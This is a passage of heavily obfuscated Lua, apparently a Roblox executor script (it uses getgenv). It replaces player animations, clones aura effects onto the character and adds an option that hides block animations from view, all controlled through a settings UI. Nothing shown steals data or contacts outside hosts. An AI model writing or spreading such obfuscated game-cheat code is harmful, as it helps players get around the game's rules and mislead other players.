 _IlIllllllI(_IlIIIIlIIl) local _llllIIIlIl = _IlIllIIllI.WalkAnimation and _IlIllIIllI.WalkAnimation.Value or "\078\111\114\109\097\108" if _llllIIIlIl ~= "\078\111\114\109\097\108" and _llllIIIlIl ~= "\070\108\121\105\110\103" then local _IIIIllIIlI = _lIlIlllIIl[_llllIIIlIl] or "" if _IIIIllIIlI ~= "" then _lIlIIIIlll(_IIIIllIIlI) end
 end
 end
 ) end
 ) _IlIllIIllI.WalkAnimation:OnChanged( function (_llllIIIlIl) _lIllIIllIl() if _llllIIIlIl ~= "\078\111\114\109\097\108" and _llllIIIlIl ~= "\070\108\121\105\110\103" then local _IIIIllIIlI = _lIlIlllIIl[_llllIIIlIl] or "" if _IIIIllIIlI ~= "" then task.spawn( function () _lIlIIIIlll(_IIIIllIIlI) local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIlIIl = _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_llllIIllIl and _IlIIIIlIIl and _IlIIIIlIIl.MoveDirection ~= Vector3.new()) then return end
 pcall( function () _llllIIllIl:Play(0.1) end
 ) pcall( function () _llllIIllIl:AdjustSpeed(_IlIllIIllI.WalkAnimSpeed and _IlIllIIllI.WalkAnimSpeed.Value or 0x1) end
 ) end
 ) end
 end
 end
 ) _IlllIIIlII = RunService.Heartbeat:Connect( function () local _llllIIIlIl = _IlIllIIllI.WalkAnimation and _IlIllIIllI.WalkAnimation.Value or "\078\111\114\109\097\108" if _llllIIIlIl == "\078\111\114\109\097\108" then _lIllIIllIl() return end
 local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIlIIl = _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not (_IIIlIlllll and _IlIIIIlIIl) then _lIllIIllIl() return end
 if _IlIIIIlIIl.Health <= 0x0 or _IlIIIIlIIl:GetState() == Enum.HumanoidStateType.Dead then _lIllIIllIl() return end
 if _llllIIIlIl == "\070\108\121\105\110\103" then if _llllIIllIl then pcall( function () _llllIIllIl:Stop(0.1) end
 ) _llllIIllIl = nil _IIIllIIIlI = "" end
 if not next(_IIlllllllI) then task.spawn(_lIIllIlIll) return end
 local _IlIIIIIIll = _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not _IlIIIIIIll then return end
 if _IlIIIIlIIl.MoveDirection == Vector3.new() then _lIllIIIlll(nil) return end
 local _lIIlIIllII = _lIlIIlIlII.MouseBehavior == Enum.MouseBehavior.LockCenter local _lIIlIIllIl = math.round(_IlIIIIlIIl.MoveDirection:Dot(_IlIIIIIIll.CFrame.LookVector)) local _llIIllIIlI = math.round(_IlIIIIlIIl.MoveDirection:Dot(_IlIIIIIIll.CFrame.RightVector)) local _IIIlIllIIl if _lIIlIIllII then _IIIlIllIIl = {} if _lIIlIIllIl == 0x1 then table.insert(_IIIlIllIIl, "\070\111\114\119\097\114\100") elseif _lIIlIIllIl == -0x1 then table.insert(_IIIlIllIIl, "\066\097\099\107") end
 if _llIIllIIlI == 0x1 then table.insert(_IIIlIllIIl, "\082\105\103\104\116") elseif _llIIllIIlI == -0x1 then table.insert(_IIIlIllIIl, "\076\101\102\116") end
 if #_IIIlIllIIl == 0x0 then _IIIlIllIIl = nil end
 else _IIIlIllIIl = { "\070\111\114\119\097\114\100" } end
 _lIllIIIlll(_IIIlIllIIl) for _lllIlllIIl, _llIIllIlIl in pairs(_IIlllllllI) do if _llIIllIlIl.IsPlaying then pcall( function () _llIIllIlIl:AdjustSpeed(_IlIllIIllI.WalkAnimSpeed and _IlIllIIllI.WalkAnimSpeed.Value or 0x1) end
 ) end
 end
 return end
 if next(_IIlllllllI) then _lIlIIlIIll() end
 local _IIIIllIIlI = _lIlIlllIIl[_llllIIIlIl] or "" if _IIIIllIIlI == "" then _lIllIIllIl() return end
 if _IIIllIIIlI ~= _IIIIllIIlI then task.spawn(_lIlIIIIlll, _IIIIllIIlI) return end
 if _IlIIIIlIIl.MoveDirection == Vector3.new() then if _llllIIllIl and _llllIIllIl.IsPlaying then pcall( function () _llllIIllIl:Stop(0.1) end
 ) if _IIlIlIlllI then _IIlIlIlllI:Cancel() _IIlIlIlllI = nil end
 local _lIIlIIllIl = _IlIllIIllI.IdleAnimation and _IlIllIIllI.IdleAnimation.Value or "\078\111\114\109\097\108" if _lIIlIIllIl == "\078\111\114\109\097\108" then task.spawn( function () RunService.RenderStepped:Wait() end
 ) end
 end
 return end
 if _llllIIllIl and not _llllIIllIl.IsPlaying then pcall( function () _llllIIllIl:Play(0.1) end
 ) if _IIIIllIIlI == "\049\055\056\054\048\052\054\055\054\050\056" then pcall( function () _llllIIllIl:AdjustSpeed(0x0) end
 ) pcall( function () _llllIIllIl.TimePosition = 1.25 end
 ) if _IIlIlIlllI then _IIlIlIlllI:Cancel() _IIlIlIlllI = nil end
 _IIlIlIlllI = _llIIIIIIII:Create( _llllIIllIl, TweenInfo.new(0x2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -0x1, true, 0x0), { TimePosition = 1.5 } ) _IIlIlIlllI:Play() end
 end
 if _llllIIllIl and _IIIIllIIlI ~= "\049\055\056\054\048\052\054\055\054\050\056" then pcall( function () _llllIIllIl:AdjustSpeed(_IlIllIIllI.WalkAnimSpeed and _IlIllIIllI.WalkAnimSpeed.Value or 0x1) end
 ) end
 end
 ) table.insert(_llIlllIlIl, function () if _IlIIlIIlII then _IlIIlIIlII:Disconnect() _IlIIlIIlII = nil end
 if _IlllIIIlII then _IlllIIIlII:Disconnect() _IlllIIIlII = nil end
 if _IIlIlIlllI then _IIlIlIlllI:Cancel() _IIlIlIlllI = nil end
 _lIllIIllIl() pcall( function () _IlIllIIllI.WalkAnimation:SetValue("\078\111\114\109\097\108") end
 ) end
 ) task.spawn( function () local _llllIIIlIl = _IlIllIIllI.WalkAnimation and _IlIllIIllI.WalkAnimation.Value or "\078\111\114\109\097\108" if _llllIIIlIl == "\078\111\114\109\097\108" then return end
 local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIlIIl = _IIIlIlllll and _IIIlIlllll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIllllll = _IlIIIIlIIl and _IlIIIIlIIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _IIIIllllll then local _lIlllIlIll = { ["\055\056\049\053\054\049\056\049\055\053"] = true, ["\049\052\053\049\054\050\055\051\053\048\049"] = true, ["\049\051\057\051\053\053\052\056\053\053\050"] = true } for _lllIlllIIl, _IIIIllIIIl in ipairs(_IIIIllllll:GetPlayingAnimationTracks()) do local _llIIIllIll = _IIIIllIIIl.Animation and _IIIIllIIIl.Animation.AnimationId:match("\037\100\043") or "" if _lIlllIlIll[_llIIIllIll] then _IIIIllIIIl:Stop(0x0) end
 end
 end
 if _llllIIIlIl ~= "\070\108\121\105\110\103" then local _IIIIllIIlI = _lIlIlllIIl[_llllIIIlIl] or "" if _IIIIllIIlI ~= "" then _lIlIIIIlll(_IIIIllIIlI) local _IIllllIlII = _llIIIlIIll.Character local _IlIIIllIlI = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llllIIllIl and _IlIIIllIlI and _IlIIIllIlI.MoveDirection ~= Vector3.new() then pcall( function () _llllIIllIl:Play(0.1) end
 ) pcall( function () _llllIIllIl:AdjustSpeed(_IlIllIIllI.WalkAnimSpeed and _IlIllIIllI.WalkAnimSpeed.Value or 0x1) end
 ) end
 end
 elseif _llllIIIlIl == "\070\108\121\105\110\103" then _lIIllIlIll() end
 end
 ) end
 do local _lIlIIIIIlI = nil local _llIlIlIlIl = nil local _lllIlIllll = nil local _IlllIIIllI = nil local _llIIllIIll = { Spin = "\049\056\056\054\051\050\048\049\049", Crazy = "\054\056\051\051\057\056\052\056" } local _IIlIllIIII = { "\054\056\051\051\057\056\052\056", "\050\056\051\053\052\053\053\056\051" } local function _llIllIlIII() if _lIlIIIIIlI then pcall( function () _lIlIIIIIlI:Stop(0x0) end
 ) _lIlIIIIIlI = nil end
 end
 local function _lIlllIIIlI() if _llIlIlIlIl then pcall( function () _llIlIlIlIl:Stop(0x0) end
 ) _llIlIlIlIl = nil end
 end
 local function _IIlIIllIll() if _lllIlIllll then _lllIlIllll:Disconnect() _lllIlIllll = nil end
 if _IlllIIIllI then _IlllIIIllI:Disconnect() _IlllIIIllI = nil end
 _llIllIlIII() _lIlllIIIlI() local _IllIlIlIIl = math.random() * 0.15 + 0.05 local _IlllllIllI = -0x1 local _IIIlllllIl = false local _lIlllIIlII = false local function _llllllllII(_IIIIlIIllI, _IIIIllIIlI) local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIIllIIlI local _lIIlIIIlII, _llIIllIlIl = pcall( function () return _IIIIlIIllI:LoadAnimation(_llllIlIllI) end
 ) if _lIIlIIIlII and _llIIllIlIl then _llIIllIlIl.Priority = Enum.AnimationPriority.Action3 _llIIllIlIl.Looped = false return _llIIllIlIl end
 end
 _IlllIIIllI = RunService.RenderStepped:Connect( function () if getgenv().InvisActive then return end
 local _llllIIIlIl = _IlIllIIllI.LoopedAnimation and _IlIllIIllI.LoopedAnimation.Value or "\078\111\110\101" if _llllIIIlIl ~= "\067\114\097\122\121" then return end
 if _IIIlllllIl and _lIlIIIIIlI then if not _lIlIIIIIlI.IsPlaying then pcall( function () _lIlIIIIIlI:Play() end
 ) end
 pcall( function () _lIlIIIIIlI:AdjustWeight(1e9) end
 ) end
 if _lIlllIIlII and _llIlIlIlIl then if not _llIlIlIlIl.IsPlaying then pcall( function () _llIlIlIlIl:Play() end
 ) end
 pcall( function () _llIlIlIlIl:AdjustWeight(1e9) end
 ) end
 end
 ) _lllIlIllll = RunService.Heartbeat:Connect( function (dt) if getgenv().InvisActive then if _IIIlllllIl or _lIlllIIlII then _IIIlllllIl = false _lIlllIIlII = false pcall( function () if _lIlIIIIIlI then _lIlIIIIIlI:Stop(0x0) end
 end
 ) pcall( function () if _llIlIlIlIl then _llIlIlIlIl:Stop(0x0) end
 end
 ) end
 return end
 local _llllIIIlIl = _IlIllIIllI.LoopedAnimation and _IlIllIIllI.LoopedAnimation.Value or "\078\111\110\101" local _IlllIllIII = _llIIllIIll[_llllIIIlIl] local _IIllllIlII = _llIIIlIIll.Character local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") local _IIIIlIIllI = _IlIIIlIIII and _IlIIIlIIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not (_IIllllIlII and _IlIIIlIIII and _IIIIlIIllI) then _llIllIlIII() return end
 if not _IlllIllIII then if _lIlIIIIIlI and _lIlIIIIIlI.IsPlaying then _llIllIlIII() end
 return end
 if not _lIlIIIIIlI or not _lIlIIIIIlI.Animation.AnimationId:match(_IlllIllIII) then _llIllIlIII() local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IlllIllIII local _lIIlIIIlII, _llIIllIlIl = pcall( function () return _IIIIlIIllI:LoadAnimation(_llllIlIllI) end
 ) if _lIIlIIIlII and _llIIllIlIl then _lIlIIIIIlI = _llIIllIlIl _lIlIIIIIlI.Priority = Enum.AnimationPriority.Action3 _lIlIIIIIlI.Looped = (_llllIIIlIl ~= "\067\114\097\122\121") end
 _IllIlIlIIl = math.random() * 0.15 + 0.05 _IlllllIllI = -0x1 end
 if _llllIIIlIl == "\067\114\097\122\121" then local _lllIlllllI = _IlIllIIllI.LoopedAnimationSpeed and _IlIllIIllI.LoopedAnimationSpeed.Value or 0x1 if _IlllllIllI >= 0x0 then _IlllllIllI = _IlllllIllI - dt if _IlllllIllI <= 0x0 then _IlllllIllI = -0x1 _IllIlIlIIl = math.random() * 0.6 + 0.4 end
 elseif not _IIIlllllIl and not _lIlllIIlII then _IllIlIlIIl = _IllIlIlIIl - dt if _IllIlIlIIl <= 0x0 then local _lIIIllIIll = math.random(0x1, 0xA) <= 0x6 local _IlIIlIIlIl = _llIlIlIlIl and _llIlIlIlIl.Animation and _llIlIlIlIl.Animation.AnimationId:match("\037\100\043") or "" if _IlIIlIIlIl ~= _IIlIllIIII[0x2] then _lIlllIIIlI() _llIlIlIlIl = _llllllllII(_IIIIlIIllI, _IIlIllIIII[0x2]) end
 _lIlllIIlII = true pcall( function () _llIlIlIlIl:Play() end
 ) pcall( function () _llIlIlIlIl:AdjustSpeed(_lllIlllllI * 0x2) end
 ) if _lIIIllIIll then local _IlIllIlllI = _lIlIIIIIlI and _lIlIIIIIlI.Animation and _lIlIIIIIlI.Animation.AnimationId:match("\037\100\043") or "" if _IlIllIlllI ~= _IIlIllIIII[0x1] then _llIllIlIII() _lIlIIIIIlI = _llllllllII(_IIIIlIIllI, _IIlIllIIII[0x1]) end
 _IIIlllllIl = true pcall( function () _lIlIIIIIlI:Play() end
 ) pcall( function () _lIlIIIIIlI:AdjustSpeed(_lllIlllllI * 0x3) end
 ) task.delay(math.random() * 0.03 + 0.03, function () if _llllIIIlIl ~= "\067\114\097\122\121" then return end
 _IIIlllllIl = false pcall( function () if _lIlIIIIIlI then _lIlIIIIIlI:Stop(0x0) end
 end
 ) end
 ) end
 task.delay(math.random() * 0.04 + 0.04, function () if _llllIIIlIl ~= "\067\114\097\122\121" then return end
 _lIlllIIlII = false pcall( function () if _llIlIlIlIl then _llIlIlIlIl:Stop(0x0) end
 end
 ) _IlllllIllI = math.random() * 0.05 end
 ) end
 end
 else if _lIlIIIIIlI then _lIlIIIIIlI.Looped = true if not _lIlIIIIIlI.IsPlaying then _lIlIIIIIlI:Play() end
 pcall( function () _lIlIIIIIlI:AdjustSpeed(_IlIllIIllI.LoopedAnimationSpeed and _IlIllIIllI.LoopedAnimationSpeed.Value or 0x1) end
 ) end
 end
 end
 ) end
 _IIlIIllIll() _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) local _IlIIIlIIII = _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not _IlIIIlIIII then return end
 local _IIIIlIIllI = _IlIIIlIIII:WaitForChild("\065\110\105\109\097\116\111\114", 0xA) if not _IIIIlIIllI then return end
 task.wait(0.1) _IIlIIllIll() end
 ) table.insert(_llIlllIlIl, function () if _lllIlIllll then _lllIlIllll:Disconnect() _lllIlIllll = nil end
 if _IlllIIIllI then _IlllIIIllI:Disconnect() _IlllIIIllI = nil end
 _llIllIlIII() _lIlllIIIlI() pcall( function () _IlIllIIllI.LoopedAnimation:SetValue("\078\111\110\101") end
 ) end
 ) end
 if _IlllIlIllI and _llIIIlIIII then local _IIIlIIIIll = _llIIIlIIII _IIIlIIIIll:AddDropdown("\067\117\115\116\111\109\066\108\111\099\107\065\110\105\109\097\116\105\111\110", { Values = { "\078\111\114\109\097\108", "\079\110\101\032\072\097\110\100", "\071\111\106\111", "\073\110\102\105\110\105\116\121", "\066\111\120\101\114" }, Default = 0x1, Multi = false, Text = "\066\108\111\099\107\032\065\110\105\109\097\116\105\111\110", }) _IIIlIIIIll:AddToggle("\085\073\082\101\097\099\116\069\110\097\098\108\101\100", { Text = "\085\108\116\114\097\032\073\110\115\116\105\110\099\116\032\082\101\097\099\116\105\111\110", Default = false, }) _IIIlIIIIll:AddSlider("\085\073\082\101\097\099\116\086\111\108\117\109\101", { Text = "\086\111\108\117\109\101", Default = 0x1, Min = 0x0, Max = 0x1, Rounding = 0x1, }) _IIIlIIIIll:AddDropdown("\065\117\114\097\083\101\108\101\099\116\105\111\110", { Text = "\065\117\114\097", Values = { "\085\108\116\114\097\032\073\110\115\116\105\110\099\116", "\066\111\117\110\100\108\101\115\115\032\082\097\103\101" }, Default = {}, Multi = true, }) _IIIlIIIIll:AddSlider("\065\117\114\097\086\111\108\117\109\101", { Text = "\086\111\108\117\109\101", Default = 0x1, Min = 0x0, Max = 0x1, Rounding = 0x2, }) local _IlIIlIIlIl = nil local _lIIIllIlIl = nil local _IlllIllllI = true local function _IIIllIlllI() if _IlIIlIIlIl then _IlIIlIIlIl:Disconnect() _IlIIlIIlIl = nil end
 if _lIIIllIlIl then _lIIIllIlIl:Disconnect() _lIIIllIlIl = nil end
 _isBlocking = false _suppressNext = false local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) if not (_IIllllIlII and _IlIIIlIIII) then return end
 _IlIIlIIlIl = _IlIIIlIIII.AnimationPlayed:Connect( function (_llIIllIlIl) local _lIIlllllll = _IlIllIIllI.CustomBlockAnimation.Value local _IlIIIIIlll = _llIIllIlIl.Animation.AnimationId if (_IlIIIIIlll:match("\049\048\052\055\048\051\056\057\056\050\055") or _IlIIIIIlll:match("\049\051\051\056\048\055\055\056\049\057\051") or _IlIIIIIlll:match("\049\051\057\051\053\053\052\056\053\053\050")) and _lIIlllllll ~= "\078\111\114\109\097\108" then if _IIlIlIIlIl.InvisibleMoves_Block.Value then _llIIllIlIl:AdjustWeight(-0xF423F) else _llIIllIlIl:Stop() end
 end
 end
 ) local _IllllIllIl = { "\049\051\051\048\057\052\054\054\050\048\052\057\049\053\053", "\049\051\052\055\049\049\055\051\049\055\050\057\057\056\054", "\055\054\057\054\051\057\054\053\052\048\054\050\057\054", "\057\050\053\052\054\055\057\049\050\053\049\054\051\051", "\049\050\056\049\056\056\055\050\053\049\051\052\049\049\052", "\049\048\057\048\056\056\054\051\050\056\054\048\052\056\056", "\055\056\051\051\057\050\055\050\054\048\050\055\051\051", "\049\050\055\048\049\053\054\057\055\048\051\054\048\055\053", } local _llllIIlIIl = { "\055\050\053\053\053\052\051\052\050\056\056\057\056\053", "\057\049\048\054\055\050\057\052\054\052\050\052\052\050", "\049\048\052\049\050\052\053\051\052\057\050\051\050\054\056" } local _lIlIllllll = 0x0 local _lllIIIIIII = nil local _lIlIlIIllI = 0x1 local _llllIlllII = nil local function _llllIlIlll() if _lllIIIIIII and _lllIIIIIII.IsPlaying then _lllIIIIIII:Stop() end
 local _IIlIIllIll = Instance.new("\065\110\105\109\097\116\105\111\110") _IIlIIllIll.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IllllIllIl[_lIlIlIIllI] _lllIIIIIII = _IlIIIlIIII:LoadAnimation(_IIlIIllIll) _lllIIIIIII.Priority = Enum.AnimationPriority.Action4 _lllIIIIIII:Play(0.05) _lllIIIIIII.TimePosition = 0.2 _lllIIIIIII:AdjustSpeed(1.2) _lIlIlIIllI = _lIlIlIIllI + 0x1 if _lIlIlIIllI > #_IllllIllIl then _lIlIlIIllI = 0x1 end
 local _llllIllIlI = Instance.new("\083\111\117\110\100", _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IIllllIlII) _llllIllIlI.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _llllIIlIIl[math.random(0x1, #_llllIIlIIl)] _llllIllIlI.Volume = _IlIllIIllI.UIReactVolume.Value _llllIllIlI:Play() task.delay(_llllIllIlI.TimeLength + 0x4, function () pcall( function () _llllIllIlI:Destroy() end
 ) end
 ) end
 _lIIIllIlIl = _IIllllIlII:GetAttributeChangedSignal("\066\108\111\099\107\082\101\097\099\116"):Connect( function () if not _IIlIlIIlIl.UIReactEnabled.Value then return end
 local _IllIllIIlI = math.abs(_IIllllIlII:GetAttribute("\066\108\111\099\107\082\101\097\099\116") or 0x0) if _lIlIllllll < _IllIllIIlI or math.abs(_IllIllIIlI - _lIlIllllll) > 0x1 then _llllIlIlll() end
 _lIlIllllll = _IllIllIIlI end
 ) task.spawn( function () while _IlllIllllI and _llIIIlIIll.Character == _IIllllIlII do local _lIlIllIlII local _IIIllllIIl = '' repeat repeat task.wait() if not _IlllIllllI or _llIIIlIIll.Character ~= _IIllllIlII then return end
 until _IIllllIlII:GetAttribute("\066\108\111\099\107\105\110\103") == true _lIlIllIlII = _IlIllIIllI.CustomBlockAnimation.Value _IIIllllIIl = _lIlIllIlII == "\078\111\114\109\097\108" and '' or (_lIlIllIlII == "\079\110\101\032\072\097\110\100" and "\049\055\048\057\055\049\052\054\053\057\057" or (_lIlIllIlII == "\071\111\106\111" and "\049\056\052\053\057\049\055\056\051\053\051" or (_lIlIllIlII == "\073\110\102\105\110\105\116\121" and "\049\053\048\050\048\057\054\053\048\057\052" or (_lIlIllIlII == "\066\111\120\101\114" and "\049\052\054\049\054\050\055\050\054\054\056" or '')))) until not _IIIllllIIl:match("\094\037\115\042\036") if not _IlllIllllI or _llIIIlIIll.Character ~= _IIllllIlII then return end
 local _llIlIIlIlI pcall( function () local _IIlIIllIll = Instance.new("\065\110\105\109\097\116\105\111\110") _IIlIIllIll.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIllllIIl _llIlIIlIlI = _IlIIIlIIII:LoadAnimation(_IIlIIllIll) end
 ) if not _llIlIIlIlI then task.wait(0.1) continue end
 _llllIlllII = _llIlIIlIlI pcall( function () if not _llIlIIlIlI.IsPlaying then _llIlIIlIlI.Looped = true _llIlIIlIlI:Play() if _IIIllllIIl == "\049\055\048\057\055\049\052\054\053\057\057" then _llIlIIlIlI.TimePosition = 0x1 _llIlIIlIlI:AdjustSpeed(0x0) elseif _IIIllllIIl == "\049\056\052\053\057\049\055\056\051\053\051" then _llIlIIlIlI.TimePosition = 0.5 _llIlIIlIlI:AdjustSpeed(0x0) elseif _IIIllllIIl == "\049\053\048\050\048\057\054\053\048\057\052" then _llIlIIlIlI.TimePosition = 0x1 _llIlIIlIlI:AdjustSpeed(0x0) elseif _IIIllllIIl == "\049\052\054\049\054\050\055\050\054\054\056" then _llIlIIlIlI.TimePosition = 0.25 _llIlIIlIlI:AdjustSpeed(0x0) game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101"):Create(_llIlIIlIlI, TweenInfo.new(0x2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -0x1, true, 0x0), {TimePosition = 0.4}):Play() end
 end
 end
 ) repeat task.wait() until _IIllllIlII:GetAttribute("\066\108\111\099\107\105\110\103") ~= true or not _IlllIllllI or _llIIIlIIll.Character ~= _IIllllIlII pcall( function () if _llIlIIlIlI then _llIlIIlIlI:Stop(0.1) end
 end
 ) _llllIlllII = nil end
 end
 ) end
 if _llIIIlIIll.Character then task.spawn(_IIIllIlllI) end
 local _lIIIIIllII = _llIIIlIIll.CharacterAdded:Connect( function (newChar) newChar:WaitForChild("\072\117\109\097\110\111\105\100", 0xA) task.spawn(_IIIllIlllI) end
 ) table.insert(_llIlllIlIl, function () _IlllIllllI = false if _IlIIlIIlIl then _IlIIlIIlIl:Disconnect() _IlIIlIIlIl = nil end
 if _lIIIllIlIl then _lIIIllIlIl:Disconnect() _lIIIllIlIl = nil end
 if _lIIIIIllII then _lIIIIIllII:Disconnect() _lIIIIIllII = nil end
 pcall( function () _IIlIlIIlIl.UIReactEnabled:SetValue(false) end
 ) pcall( function () _IlIllIIllI.CustomBlockAnimation:SetValue("\078\111\114\109\097\108") end
 ) end
 ) local _IlllIIllII = nil local _lIIIllIIll = {} local _lIIIlIlIll = { UI = false, BR = false } local function _IIIIlIIIIl(_IIllllIlII, _IlIIIIIlll) if not _IIllllIlII then return end
 for _lllIlllIIl, _lIIIIIIIII in ipairs(_IIllllIlII:GetDescendants()) do if _lIIIIIIIII.Name == "\065\117\114\097\072\111\108\100\101\114\095" .. _IlIIIIIlll then for _lllIlllIIl, _lIIlIIIIll in ipairs(_lIIIIIIIII:GetChildren()) do if _lIIlIIIIll:IsA("\079\098\106\101\099\116\086\097\108\117\101") and _lIIlIIIIll.Value then pcall( function () _lIIlIIIIll.Value:Destroy() end
 ) end
 end
 pcall( function () _lIIIIIIIII:Destroy() end
 ) end
 end
 if _IlIIIIIlll == "\066\082" then for _lllIlllIIl, _llIIlIIIlI in ipairs(_lIIIllIIll) do pcall( function () if _llIIlIIIlI and _llIIlIIIlI.Parent then _llIIlIIIlI:Destroy() end
 end
 ) end
 _lIIIllIIll = {} end
 end
 local function _IIlIIlllll(_IIllllIlII) if not _IIllllIlII then return end
 local _lIIlIIIlII, _IIllIIllll = pcall( function () return game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101").Emotes.VFX.VfxMods.Evolved.vfx.Folder end
 ) if not _lIIlIIIlII or not _IIllIIllll then return end
 local _llIllIIIIl = Instance.new("\070\111\108\100\101\114") _llIllIIIIl.Name = "\065\117\114\097\072\111\108\100\101\114\095\085\073" pcall( function () _llIllIIIIl:SetAttribute("\068\105\118\105\110\101\070\111\114\109", true) end
 ) pcall( function () _llIllIIIIl:SetAttribute("\076\105\109\065\117\114\097", true) end
 ) _llIllIIIIl.Parent = _IIllllIlII for _lllIlllIIl, _llIIIIlllI in ipairs(_IIllIIllll:GetChildren()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") then local _IIIllllIll = _IIllllIlII:FindFirstChild(_llIIIIlllI.Name) if _IIIllllIll then local _lIIIllIIll = _llIIIIlllI:Clone() pcall( function () _lIIIllIIll:SetAttribute("\076\105\109\065\117\114\097", true) end
 ) _lIIIllIIll.Transparency = 0x1 _lIIIllIIll.Massless = true _lIIIllIIll.Name = tostring(math.random(0x1, 0xF4240)) local _IlllIIIlIl = Instance.new("\087\101\108\100") _IlllIIIlIl.Part0 = _IIIllllIll _IlllIIIlIl.Part1 = _lIIIllIIll _IlllIIIlIl.Parent = _lIIIllIIll _lIIIllIIll.Parent = _llIllIIIIl for _lllIlllIIl, desc in ipairs(_lIIIllIIll:GetDescendants()) do if desc:IsA("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114") or desc:IsA("\066\101\097\109") then pcall( function () desc:SetAttribute("\076\105\109\105\116\101\100\065\117\114\097", true) end
 ) end
 end
 end
 end
 end
 end
 local function _IIlllIIIIl(_IIllllIlII) if not _IIllllIlII then return end
 local _lIIlIIIlII, auraChar = pcall( function () return game:GetService("\082\101\112\108\105\099\097\116\101\100\083\116\111\114\097\103\101").Emotes.VFX.VfxMods.Boundless.vfx.AuraChar:Clone() end
 ) if not _lIIlIIIlII or not auraChar then return end
 local _llIllIIIIl = Instance.new("\070\111\108\100\101\114") _llIllIIIIl.Name = "\065\117\114\097\072\111\108\100\101\114\095\066\082" _llIllIIIIl.Parent = _IIllllIlII local _llllIllIIl = _IIllllIlII:FindFirstChild("\084\111\114\115\111") or _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _llllIllIIl then local _llIIlIIIlI = Instance.new("\083\111\117\110\100") _llIIlIIIlI.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\056\049\048\053\053\057\057\048\053\056\049\054\053\048" _llIIlIIIlI.Looped = true _llIIlIIIlI.Volume = _IlIllIIllI.AuraVolume.Value _llIIlIIIlI.Name = "\066\082\065\117\114\097\083\111\117\110\100" _llIIlIIIlI.Parent = _llllIllIIl _llIIlIIIlI:Play() table.insert(_lIIIllIIll, _llIIlIIIlI) end
 for _lllIlllIIl, _llIIIIlllI in ipairs(auraChar:GetChildren()) do if _llIIIIlllI:IsA("\066\097\115\101\080\097\114\116") then local _IIIllllIll = _IIllllIlII:FindFirstChild(_llIIIIlllI.Name) if _IIIllllIll then for _lllIlllIIl, desc in ipairs(_llIIIIlllI:GetChildren()) do if desc:IsA("\065\116\116\097\099\104\109\101\110\116") or desc:IsA("\080\097\114\116\105\099\108\101\069\109\105\116\116\101\114") then local _lIIIllIIll = desc:Clone() pcall( function () _lIIIllIIll:SetAttribute("\076\105\109\105\116\101\100\065\117\114\097", true) end
 ) _lIIIllIIll.Parent = _IIIllllIll local _llIIIIlIlI = Instance.new("\079\098\106\101\099\116\086\097\108\117\101") _llIIIIlIlI.Name = "\066\082\065\117\114\097\082\101\102" _llIIIIlIlI.Value = _lIIIllIIll _llIIIIlIlI.Parent = _llIllIIIIl end
 end
 end
 end
 end
 auraChar:Destroy() end
 local function _IlllllIlII(_IIllllIlII) if not _IIllllIlII then return end
 local _lIllIlIIll = _IlIllIIllI.AuraSelection and _IlIllIIllI.AuraSelection.Value or {} local _llIIlIlIIl = rawget(_lIllIlIIll, "\085\108\116\114\097\032\073\110\115\116\105\110\099\116") and true or false local _IllllIlIlI = rawget(_lIllIlIIll, "\066\111\117\110\100\108\101\115\115\032\082\097\103\101") and true or false if _lIIIlIlIll.UI and not _llIIlIlIIl then _IIIIlIIIIl(_IIllllIlII, "\085\073") _lIIIlIlIll.UI = false end
 if _lIIIlIlIll.BR and not _IllllIlIlI then _IIIIlIIIIl(_IIllllIlII, "\066\082") _lIIIlIlIll.BR = false end
 if _llIIlIlIIl and not _lIIIlIlIll.UI then _IIlIIlllll(_IIllllIlII) _lIIIlIlIll.UI = true end
 if _IllllIlIlI and not _lIIIlIlIll.BR then _IIlllIIIIl(_IIllllIlII) _lIIIlIlIll.BR = true end
 end
 local function _IIlIllIIII() local _IIIIIIIlll = _IlIllIIllI.AuraVolume.Value local _IIllllIlII = _llIIIlIIll.Character if _IIllllIlII then for _lllIlllIIl, _llIIlIIIlI in ipairs(_lIIIllIIll) do pcall( function () _llIIlIIIlI.Volume = _IIIIIIIlll end
 ) end
 end
 end
 _IlIllIIllI.AuraSelection:OnChanged( function () _IlllllIlII(_llIIIlIIll.Character) end
 ) _IlIllIIllI.AuraVolume:OnChanged( function () _IIlIllIIII() end
